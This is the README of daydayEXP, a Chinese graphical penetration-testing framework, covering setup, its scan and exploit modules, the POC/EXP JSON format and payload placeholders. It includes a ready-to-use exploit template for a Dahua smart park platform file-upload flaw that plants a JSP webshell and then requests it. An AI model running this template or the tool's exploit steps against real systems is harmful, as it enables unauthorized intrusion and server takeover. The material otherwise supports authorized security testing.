 <h1>daydayEXP</h1>
![](https://img.shields.io/badge/author-bcvgh-red)

## 项目简介：
基于java fx写的一款支持加载自定义poc文件的、可扩展的的图形化渗透测试框架。支持批量漏洞扫描、漏洞利用、结果导出等功能。

## 使用
经过测试，项目可在jdk8环境下正常使用。jdk11因为缺少一些必要的组件，所以jdk11版本工具为jdk8版本项目的阉割版，无法使用反序列化利用模块（不影响针对反序列化漏洞的默认的URLDNS链探测）。

（请务必使用-Dfile.encoding=UTF-8参数打开项目，否则可能出现乱码、报错等问题）
```
java -jar -Dfile.encoding=UTF-8 dadayExp-1.0-jar-with-dependencies.jar   (jdk8)

因为jdk11以后就不自带javafx依赖了,所以运行需要指定javafx路径
java --module-path {javafx lib path} --add-modules ALL-MODULE-PATH -jar dadayExp-1.0-jar-with-dependencies.jar
```
### 使用建议
建议设置代理配合burp使用，在更新poc仓库和修改config.json文件后请及时`加载本地poc`。（如果涉及到修改api则需要重启项目）

### 初次使用
打开工具，本地无poc，需要先从`poc管理-在线更新poc仓库`从github仓库或自定义仓库加载poc文件到本地，并在主面板`加载本地poc`后使用。

（也可以将poc仓库中poc文件夹和config.json配置文件直接下载到工具当前目录下的poc目录中）

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/39800780-33d8-4d69-aba0-e188e1b6f9b0)


#### 仓库搭建
详情查看[仓库搭建说明](https://github.com/bcvgh/daydayEXP/blob/main/repository.md) 

## 主要模块
### 漏洞扫描
选择一级菜单可对所有该标签下的漏洞都进行检测，选择二级则对单个漏洞扫描。支持批量扫描url、导出扫描结果、设置线程数等。
同时也支持设置dnslog，使用该模块可减少命令执行、反序列漏洞无回显导致的误报、漏报。

（如需要设置dnslog，请在项目启动前设置好config.json中dnslog的api等参数）

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/3c5a4aa6-562d-45b6-91fc-5c05357cfdde)


### 漏洞利用
点击漏洞利用按钮，会根据当前漏洞的type类型动态生成相应的利用场景
目前支持的类型
```
exec
upload
custom
deserialization
other
```
#### exec
原理：匹配返回包中的命令执行回显。（无回显漏洞则需要自行验证）

例如命令执行、代码执行、SQL注入xpcmdshell等都归结到这一类

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/01633f96-b317-4cb0-932b-3a54ab1991b4)


#### upload
原理：匹配返回包中的上传路径（非必要）后，拼接上传路径。

例如文件上传、任意文件写入、任意文件覆盖等都归结到这一类

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/06e3e668-2ff8-41ce-b263-e5bdd6e1be00)


#### deserialization（暂只支持jdk8版本）
原理：自行选择反序列化gadget构造payload发送利用。

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/7107dc5c-7ba4-4651-b9db-b948838c10d8)



### custom
在无法通过上述3种类型构造payload时使用，可根据自己的思路构造此类poc。

(可参考帆软v10反序列化漏洞poc)

![image](https://github.com/bcvgh/daydaypoc_test/assets/56790427/d51f9cec-c41e-4a56-a97a-c49e28c2d680)


## POC编写
可通过`POC管理-新增POC`处添加，也可以自行编辑文本添加
json文件中除了基本的name、tag等还包括poc和exp(目前exp只支持type为upload、deserialization和exec，如遇到其他类型漏洞，如：未授权、sql注入等建议只设置好poc字段进行一个初步漏洞检测，后续手工进行利用)
### POC模版

```
name  :   漏洞名称
tag   ：  漏洞标签（如:fanwei、youyong等，需要正确填写，否则会影响到POC文件正确加载）
type  ：  漏洞类型（如:upload、exec等，需要正确填写，否则影响EXP模块正常使用）
poc   :   漏洞检测
	pocGet:url路径
	pocPost:post数据(需要换行的情况建议用\r\n代替\n)
	header:
        status_code:匹配返回包状态码,支持多选如200,403
	pattern:匹配返回包的特征值（正则），通过匹配该字段确定漏洞是否存在
exp   ：
	step（n）：漏洞利用过程中的请求包先后顺序（step1代表请求的第一个数据包，step2、step3以此类推）
		expGet:url路径
		expPost:post数据
		header:
		status_code:匹配返回包状态码,支持多选如200,403
		pattern：匹配返回包的特征值（正则），当type类型为exec时，用来匹配返回包中的命令执行结果，upload类型则是一般用来匹配文件上传后随机生成的文件名。
```

例如:

```
{
	"name":"大华智慧园区管理平台文件上传",
	"tag":"dahua",
	"type":"upload",
	"poc":{
		"pocGet":"/publishing/publishing/material/file/video",
		"pocPost":"------WebKitFormBoundaryCJEleSRxsqS0lAFv\nContent-Disposition: form-data; name=\"Filedata\";filename=\"1.jsp\"\r\n\r\n123456\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
		"header":{
			"Cookie":" JSESSIONID=33FE9EFF8693FAD43EA7752BBE013080",
			"Accept":" text/html,application/xhtml+xml,json;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
			"Upgrade-Insecure-Requests":" 1",
			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
			"Connection":" close",
			"Accept-Encoding":" gzip, deflate",
			"Accept-Language":" zh-CN,zh;q=0.9",
			"Content-Length":" 162",
			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv"
		},
		"status_code":"200",
		"pattern":"([0-9]*\\.jsp)"
	},
	"exp":{
		"step1":{
			"expGet":"/publishing/publishing/material/file/video",
			"expPost":"------WebKitFormBoundaryCJEleSRxsqS0lAFv\nContent-Disposition: form-data; name=\"Filedata\";filename=\"24k.jsp\"\r\n\r\n{{webshell}}\r\n------WebKitFormBoundaryCJEleSRxsqS0lAFv--",
			"header":{
				"Cookie":" JSESSIONID=33FE9EFF8693FAD43EA7752BBE013080",
				"Accept":" text/html,application/xhtml+xml,json;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
				"Upgrade-Insecure-Requests":" 1",
				"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
				"Connection":" close",
				"Accept-Encoding":" gzip, deflate",
				"Accept-Language":" zh-CN,zh;q=0.9",
				"Content-Length":" 162",
				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryCJEleSRxsqS0lAFv"
			},
			"status_code":"200",
			"pattern":"([0-9]*\\.jsp)"
		},
		"step2":{
			"expGet":"/publishingImg/VIDEO/{{shellpath}}",
			"header":{
				"User-Agent":"Mozilla/5.0 (Linux;",
				"content-type":"text/plain"
			},
			"status_code":"200",
			"pattern":"(.*)"
		}
	}
}
```

占位符：

```
{仅poc内可用}
{{dnslog}}:配置好dnslog平台api即可食用。一般应用于命令执行无回显,反序列化漏洞URLDNS探测的情况，减少误报率。

{仅exp内可用}
{{command}}:命令执行
{{shellpath}}:匹配到返回包中的脚本名称，应用于上传后wenshell文件名随机生成且在返回包中有回显的场景。
{{webshell}}:需要上传的文件上传内容

{poc、exp内均可使用}
{{deserialization}}:对打上此标签的位置生成反序列化数据，当在poc中使用时默认使用URLDNS链生成序列化payload，而在exp中可以根据需求自行选择构造。
{{random}}:随机生成4位数字字母，应用于poc中需要不同特征字符的特殊场景
{{url}}:即当前目标的url地址，应用在一些网站中可能会校验refer头的情况

编码：
使用案例：{{deserialization:GzipEncode}},{{command:Base64Encode:3}}(3为编码3次)
Base64Encode:对输入进行base64编码
Base64decode:对输入进行base64解码码
UrlEncode:url编码（全编码）
UrlDecode：url解码
HtmlEncode:HTML编码
HtmlDecode:HTML解码
GzipEncode:Gzip压缩
HexDecode:Hex解码
